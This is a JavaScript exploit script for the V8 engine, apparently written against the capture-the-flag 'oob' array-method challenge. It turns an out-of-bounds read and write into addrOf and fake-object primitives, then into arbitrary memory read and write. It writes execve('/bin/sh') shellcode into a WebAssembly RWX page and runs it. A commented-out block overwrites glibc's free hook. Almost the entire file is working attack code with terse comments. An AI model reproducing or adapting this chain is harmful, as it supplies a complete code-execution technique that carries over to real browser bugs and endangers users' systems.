function dp(x) {}//{%DebugPrint(x);}
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
const hex = (x) => ("0x" + x.toString(16));
const print = console.log;
// start exploitation
function addrOf(objArr, obj)
{
	objArr[0] = obj;
	// change the element to target object

	const tmpMap = objArr.oob();
	if (d2u(tmpMap) !== objectMap)
		print("Object Map changed to: " + hex(d2u(tmpMap)));
	// ensure the Map does not change after assigning

	objArr.oob(u2d(floatMap));
	// change the Map to floatMap

	const ret = objArr[0];
	// read the address of obj as double float

	objArr.oob(tmpMap);
	// change the Map back

	return d2u(ret) - 1;
}
function makeFakeArr(addr)
{
	floatArr[0] = u2d(addr + 1);
	// change the element to addr

	floatArr.oob(u2d(objectMap));
	// change Map to objectMap
	// so the element will be interpreted as pointer

	const ret = floatArr[0];
	// fetch the faked object

	floatArr.oob(u2d(floatMap));
	//recover the floatMap

	return ret;
}
const o = {}
let floatArr = [1.1];
let objArr = [o];
// [{}] does not work well,
// because we must create object first
dp(floatArr);
dp(objArr);

const floatMap = d2u(floatArr.oob());
const objectMap = d2u(objArr.oob());
print("Float Map: " + hex(floatMap))
print("Object Map: " + hex(objectMap))
// leak the floatMap and objectMap

const buffer = [u2d(floatMap),0.0,0.0,u2d(0x100000000),1.1,1.1,1.1,1.1];
// create the fake object,
// use 1.1 padding to let fast array lay just before the Object

let fakeObjAddr = addrOf(objArr, buffer);
dp(buffer);
print(hex(fakeObjAddr));
fakeObjAddr -= 0x40;
// get the address of our fake object

fakeObj = makeFakeArr(fakeObjAddr);
dp(fakeObj);
// create the fake array

function memRead(addr)
{
	buffer[2] = u2d(addr - 0x10 + 1);
	// change pointer of fast array to (addr-0x10)|1
	// need -0x10 according to memory layout of fast array
	return d2u(fakeObj[0]);
	// read the element out as result
}

const writer = new ArrayBuffer(0x30);
const dataView = new DataView(writer);
// todo: why Float64Array failed to work?
// create a DataView for arbitrary write
const addrBackOff = addrOf(objArr, writer) + 0x20;
// get the address of kBackingOffset

dp(writer);
print(hex(addrBackOff));

function memWrite(addr, val)
{
	buffer[2] = u2d(addrBackOff - 0x10 + 1);
	// change pointer of fast array to (addrBackOff-0x10)|1
	fakeObj[0] = u2d(addr);
	// kBackingOffset = addr
	dataView.setFloat64(0, u2d(val), true);
	// QWORD PTR [addr] = val
}

function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
const wmain = getWMain();
// init webassembly stuff,
// wmain is the function corresponding to
// the main function of the wasm program

const addrWmain = addrOf(objArr, wmain);
print(hex(addrWmain));
// obtain wmain instance address

function getRwxAddr(addrWmain)
{
	const sharedInfoAddr = memRead(addrWmain + 0x18) - 0x1;
	const wasmExportedFuncDataAddr = memRead(sharedInfoAddr + 0x8) - 0x1;
	const wasmInstanceAddr = memRead(wasmExportedFuncDataAddr + 0x10) - 0x1;
	return memRead(wasmInstanceAddr + 0x88);
}
const rwxPageAddr = getRwxAddr(addrWmain);
print(hex(rwxPageAddr));
// get rwx page from wmain instance address

var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];

function memWrite32(addr, val)
{
	buffer[2] = u2d(addrBackOff - 0x10 + 1);
	fakeObj[0] = u2d(rwxPageAddr);
	dataView.setUint32(0, val, true);
}
//todo: int3 will be raised if we use memWrite32 here, I don't know why

//memWrite32(rwxPageAddr, shellcode[0]);
//memWrite32(rwxPageAddr + 4, shellcode[1]);
//code that cause int3 to be raised

buffer[2] = u2d(addrBackOff - 0x10 + 1);
fakeObj[0] = u2d(rwxPageAddr);
// kBackingOffset = rwxPageAddr

for (let i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i*4, shellcode[i], true);
	// write the shellcode to rwx page
}
wmain();

/* glibc exploitation
const codeAddr = memRead(addrOf(objArr, Array.constructor) + 0x30);
print(hex(codeAddr));
const progAddr = memRead(codeAddr + 0x41) - 0x84efa0 - 0x293000;
print(hex(progAddr));

const libcAddr = memRead(progAddr + 0xd9aa28) - 0x65000;
print(hex(libcAddr));


memWrite(libcAddr + 0x3ed8e8, libcAddr + 0x4f440); // free hook
const binsh = new Uint32Array(new ArrayBuffer(0x30));
cmd = [1634628399, 1768042352, 1852256110, 761621871, 1668047203, 1952541813, 29295];
for (var i = 0; i < cmd.length; i++)
	binsh[i] = cmd[i];
binsh = undefined;

for (let i = 0; i < 0x100; i++)
{
	new ArrayBuffer(0x100);
}
*/



readline()